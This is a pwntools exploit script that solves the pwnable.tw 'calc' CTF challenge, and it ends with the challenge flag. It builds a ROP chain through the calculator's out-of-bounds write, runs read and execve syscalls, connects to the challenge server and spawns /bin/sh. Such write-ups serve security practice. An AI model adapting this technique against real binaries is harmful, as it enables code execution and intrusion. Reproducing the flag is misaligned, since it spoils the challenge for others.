from pwn import *

PROG = './calc'

offset = [0]
def payload(value, extra=0):
    # offset to write over return address with 0x64=100 is
    # +360-57005
    curr_offset = offset[0] + 360 # offset to reach return address
    offset[0] += 1 + extra
    return bytes(f'+{curr_offset}-{value}'.encode('utf-8'))

# MUST work high to low (361 -> 360)

pop_ecx_ebx = 0x080701d1
pop_eax = 0x080bc545
bss = 0x80ecf80
pop_esi = 0x0804a095
xchg_ecx = 0x080e2141


read = [
    payload(pop_ecx_ebx),
    payload(bss),
    payload(0xdeadbeef),
    payload(pop_esi),
    payload(bss),
    payload(0x080e4a79), #xchg ebx, eax
    payload(0x080701aa), #pop edx
    payload(0x100),
    payload(pop_eax),
    payload(0x03),
    payload(0x08070880), #int 0x80; ret
]


execve = [
    payload(pop_esi),
    payload(bss + 100),

    payload(0x080550d0), #xor eax, eax
    payload(xchg_ecx),

    payload(0x080481d1), #pop ebx
    payload(bss),

    payload(0x080550d0), #xor eax, eax
    payload(0x080ae7cc), #xchg edx, eax

    payload(pop_eax),
    payload(0x0b),

    payload(0x08070880), #int 0x80; ret
]

#r = gdb.debug(PROG, "b *0x08049433\n c")
#r = process(PROG)
r = remote('chall.pwnable.tw', 10100)
print(r.recvline())

order = read + execve

for p in order[::-1]:
    r.sendline(p)
    print(r.recvline())

r.sendline(b'')
r.sendline(b'/bin/sh\x00')

r.interactive()

#FLAG{C:\Windows\System32\calc.exe}
